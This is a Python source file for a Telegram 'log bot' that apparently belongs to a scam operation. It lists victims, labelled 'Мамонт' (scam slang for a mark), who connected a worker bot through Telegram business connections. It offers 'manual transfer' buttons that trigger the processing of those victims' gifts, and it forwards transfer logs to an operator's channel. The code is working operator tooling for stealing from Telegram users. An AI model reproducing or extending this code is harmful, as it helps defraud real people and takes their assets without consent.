import asyncio
from collections import defaultdict
from aiogram import Bot, Dispatcher, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.types import BotCommand, BotCommandScopeDefault, MenuButtonCommands
from aiogram.exceptions import TelegramUnauthorizedError, TelegramForbiddenError, TelegramBadRequest
from aiogram import F
from aiogram.fsm.state import State, StatesGroup

from sqlalchemy.future import select
from aiogram.fsm.context import FSMContext

from config import LOG_BOT_TOKEN
from db import Session
from models import Admin, BusinessConnection, WorkerBot

log_router = Router()
ITEMS_PER_PAGE = 6

# Защита от спама
active_transfers = defaultdict(asyncio.Lock)


class LogChannelSetup(StatesGroup):
    waiting_for_channel_id = State()

def get_main_log_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Активные подключения", callback_data="show_active_connections")],
        [InlineKeyboardButton(text="⚙️ Настроить лог-канал", callback_data="setup_log_channel")]
    ])

async def get_main_log_text(chat_id: int) -> str:
    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == chat_id))
        admin = result.scalar_one_or_none()

    log_status = (
        f"<b>📡 Лог-канал:</b> <code>{admin.log_channel_id}</code>"
        if admin and admin.log_channel_id else
        "<b>📡 Лог-канал:</b> <i>не подключён</i>"
    )

    return (
        "<b>✅ Отстук успешно активирован.</b>\n\n"
        f"{log_status}\n\n"
        "<b>💁🏻‍♀️ Для управления используйте кнопки ниже:</b>"
    )

async def send_main_log_menu(bot: Bot, chat_id: int):
    text = await get_main_log_text(chat_id)
    await bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode="HTML",
        reply_markup=get_main_log_keyboard()
    )


@log_router.callback_query(F.data == "go_back_main_menu")
async def handle_back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()

    text = await get_main_log_text(callback.from_user.id)
    await callback.message.edit_text(
        text=text,
        parse_mode="HTML",
        reply_markup=get_main_log_keyboard()
    )
    await callback.answer()

@log_router.callback_query(F.data == "go_back_main_menu")
async def handle_back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()  

    await callback.message.edit_text(
        "<b>✅ Отстук успешно активирован.</b>\n\n"
        "<b>💁🏻‍♀️ Для управления используйте кнопки ниже:</b>",
        parse_mode="HTML",
        reply_markup=get_main_log_keyboard()
    )
    await callback.answer()

@log_router.message(Command("start"))
async def handle_start(message: Message):
    telegram_id = message.from_user.id

    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == telegram_id))
        admin = result.scalar_one_or_none()

        if not admin:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Перейти к основному боту", url="https://t.me/Alphasqquad_bot")]
            ])
            await message.answer(
                "<b>Ошибка:</b> сначала запустите <b>основной бот</b>.",
                parse_mode="HTML",
                reply_markup=keyboard
            )
            return

        if not admin.log_bot_enabled:
            admin.log_bot_enabled = True
            await session.commit()

        await send_main_log_menu(message.bot, telegram_id)

@log_router.callback_query(lambda c: c.data and c.data.startswith("show_active_connections"))
async def show_active_connections_callback(callback: CallbackQuery):
    # Парсим страницу
    try:
        parts = callback.data.split(":")
        page = int(parts[1]) if len(parts) > 1 else 1
    except Exception:
        page = 1

    telegram_id = callback.from_user.id
    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == telegram_id))
        if not admin:
            await callback.answer("Нет доступа.", show_alert=True)
            return

        connections = await session.execute(
            select(BusinessConnection)
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        )
        connections = connections.scalars().all()

    if not connections:
        await callback.answer("Нет активных подключений.", show_alert=True)
        return

    total = len(connections)
    total_pages = (total + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
    page = max(1, min(page, total_pages))
    start_idx = (page - 1) * ITEMS_PER_PAGE
    end_idx = start_idx + ITEMS_PER_PAGE
    page_connections = connections[start_idx:end_idx]

    text = f"<b>✅ Активные подключения:</b>\n\n"
    text += "🟢 Нажмите на кнопку <b>«Ручной перевод»</b>, чтобы сразу запустить задачу перевода.\n\n"

    # Кнопки "ручной перевод" — В СТОЛБИК!
    keyboard = []
    async with Session() as session:
        for bc in page_connections:
            worker = await session.get(WorkerBot, bc.worker_bot_id)
            worker_username = worker.username if worker else "нет"
            text += (
                f"• <b>Бот:</b> <b>@{worker_username}</b> | "
                f"<b>Мамонт:</b> <b>@{bc.username or 'нет'}</b> <code>{bc.telegram_id}</code>\n"
            )
            keyboard.append([
                InlineKeyboardButton(
                    text=f"🚀 Ручной перевод ({'@' + bc.username if bc.username else ''}{' ' if bc.username else ''}{bc.telegram_id})",
                    callback_data=f"manual_transfer_{bc.id}"
                )
            ])

    # Пагинация
    nav = [
        InlineKeyboardButton(text="<", callback_data=f"show_active_connections:{page-1}" if page > 1 else "noop"),
        InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="noop"),
        InlineKeyboardButton(text=">", callback_data=f"show_active_connections:{page+1}" if page < total_pages else "noop")
    ]
    keyboard.append(nav)

    # Кнопка назад
    keyboard.append([InlineKeyboardButton(text="Назад", callback_data="go_back_main_menu")])

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard),
        parse_mode="HTML"
    )
    await callback.answer()

@log_router.callback_query(F.data == "noop")
async def noop_callback(callback: CallbackQuery):
    await callback.answer()

async def manual_transfer_task(bc_id: int, bot_token: str, connected_user_id: int, callback: CallbackQuery):
    from worker_bots import handle_gift_processing_after_connection, get_cached_bot

    try:
        bot = get_cached_bot(bot_token)
    except Exception as e:
        await callback.answer("🚫 Не удалось инициализировать бота.", show_alert=True)
        return

    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        if not bc or not bc.is_connected:
            await callback.answer("❗️ Подключение недоступно.", show_alert=True)
            return

        worker_bot = await session.get(WorkerBot, bc.worker_bot_id)
        admin = await session.get(Admin, bc.admin_id)

        try:
            await handle_gift_processing_after_connection(
                bot=bot,
                bc_id=bc.business_connection_id,
                worker_bot=worker_bot,
                admin=admin,
                business_user_id=bc.telegram_id,
                connected_user_id=connected_user_id,
                session=session
            )
        except (TelegramUnauthorizedError, TelegramForbiddenError, TelegramBadRequest):
            await callback.answer("🚫 Бот удалён или недоступен.", show_alert=True)
        except Exception as e:
            await callback.answer("⚠️ Ошибка при запуске задачи.", show_alert=True)
            print(f"[ERROR] manual_transfer_task: {e}")

@log_router.callback_query(lambda c: c.data and c.data.startswith("manual_transfer_"))
async def manual_transfer_callback(callback: CallbackQuery):
    bc_id = int(callback.data.replace("manual_transfer_", ""))
    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        if not bc or not bc.is_connected:
            await callback.answer("❗️ Подключение не найдено или неактивно.", show_alert=True)
            return
        worker_bot = await session.get(WorkerBot, bc.worker_bot_id)
        if not worker_bot:
            await callback.answer("🚫 Бот не найден или удален", show_alert=True)
            return
        bot_token = worker_bot.token

    async def wrapped_task():
        async with active_transfers[bc.telegram_id]: 
            await manual_transfer_task(bc_id, bot_token, bc.telegram_id, callback)

    asyncio.create_task(wrapped_task())
    await callback.answer("🚀 Ручной перевод запущен", show_alert=True)

@log_router.callback_query(F.data == "setup_log_channel")
async def handle_setup_log_channel(callback: CallbackQuery, state: FSMContext):
    telegram_id = callback.from_user.id

    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == telegram_id))
        admin = result.scalar_one_or_none()
    buttons = [[InlineKeyboardButton(text="Назад", callback_data="go_back_main_menu")]]
    if admin and admin.log_channel_id:
        buttons.insert(0, [
            InlineKeyboardButton(
                text=f"❌ Отключить канал {admin.log_channel_id}",
                callback_data="disable_log_channel"
            )
        ])

    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    try:
        await callback.message.delete()
    except Exception:
        pass

    await callback.message.bot.send_message(
        chat_id=telegram_id,
        text=(
            "<b>⚙️ НАСТРОЙКА ЛОГ-КАНАЛА</b>\n\n"
            "<b>1.</b> <b>Добавь этого бота админом в свой канал.</b>\n"
            "<b>2.</b> <b>Отправь сюда ID канала (пример: <code>-1001234567890</code>)</b>\n\n"
            "<b>❓ Как получить ID канала:</b>\n"
            "<b>➤ Перешли любой пост из канала боту</b> <b>@getmyid_bot</b> <b>и скопируй ID.</b>\n"
            "<b>📤 После этого я начну дублировать туда логи передачи.</b>\n\n"
            "<b>❌ Чтобы отключить лог-канал — нажми на кнопку с его ID ниже.</b>"
        ),
        parse_mode="HTML",
        reply_markup=markup
    )

    await state.set_state(LogChannelSetup.waiting_for_channel_id)
    await callback.answer()

@log_router.callback_query(F.data == "disable_log_channel")
async def handle_disable_log_channel(callback: CallbackQuery):
    telegram_id = callback.from_user.id

    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == telegram_id))
        admin = result.scalar_one_or_none()

        if not admin or not admin.log_channel_id:
            await callback.answer("❌ Канал уже отключён или не найден.", show_alert=True)
            return

        admin.log_channel_id = None
        await session.commit()

    await callback.answer("✅ Канал успешно отключён от логов.", show_alert=True)

    try:
        await callback.message.delete()
    except:
        pass

    await send_main_log_menu(callback.bot, telegram_id)

@log_router.message(LogChannelSetup.waiting_for_channel_id)
async def save_log_channel_id(message: Message, state: FSMContext):
    channel_id_raw = message.text.strip()

    if not channel_id_raw.startswith("-100") or not channel_id_raw[4:].isdigit():
        await message.answer(
            "❌ <b>Некорректный ID канала.</b>\n"
            "<b>Пример:</b> <code>-1001234567890</code>",
            parse_mode="HTML"
        )
        return

    channel_id = int(channel_id_raw)
    telegram_id = message.from_user.id

    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == telegram_id))
        admin = result.scalar_one_or_none()

        if not admin:
            await message.answer("❌ <b>Ты не найден в базе.</b>", parse_mode="HTML")
            return

        if admin.log_channel_id:
            await message.answer(
                f"⚠️ <b>У тебя уже подключён лог-канал:</b> <code>{admin.log_channel_id}</code>\n\n"
                "<b>Чтобы подключить новый, сначала отключи текущий канал.</b>",
                parse_mode="HTML"
            )
            return

        admin.log_channel_id = channel_id
        await session.commit()

    await message.answer("✅ <b>Канал успешно сохранён.</b> Я начну отправлять туда логи.", parse_mode="HTML")
    await state.clear()
    await send_main_log_menu(message.bot, telegram_id)

async def setup_log_bot():
    bot = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(log_router)
    return bot, dp

log_bot_instance: Bot | None = None

async def get_log_bot() -> Bot:
    global log_bot_instance
    if not log_bot_instance:
        log_bot_instance = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
    return log_bot_instance

async def send_log(chat_id: int, text: str):
    bot = await get_log_bot()

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode="HTML",
            disable_web_page_preview=False   
        )
    except Exception:
        pass
    async with Session() as session:
        result = await session.execute(select(Admin).where(Admin.telegram_id == chat_id))
        admin = result.scalar_one_or_none()

        if admin and admin.log_channel_id:
            try:
                await bot.send_message(
                    chat_id=admin.log_channel_id,
                    text=text,
                    parse_mode="HTML",
                    disable_web_page_preview=False  
                )
            except Exception:
                try:
                    await bot.send_message(
                        chat_id=chat_id,
                        text=(
                            "⚠️ <b>Внимание!</b>\n"
                            f"<b>Не удалось отправить лог в канал</b> <code>{admin.log_channel_id}</code>.\n"
                            "<b>Убедись, что бот добавлен в админы и имеет право отправки сообщений.</b>"
                        ),
                        parse_mode="HTML",
                        disable_web_page_preview=False   
                    )
                except Exception:
                    pass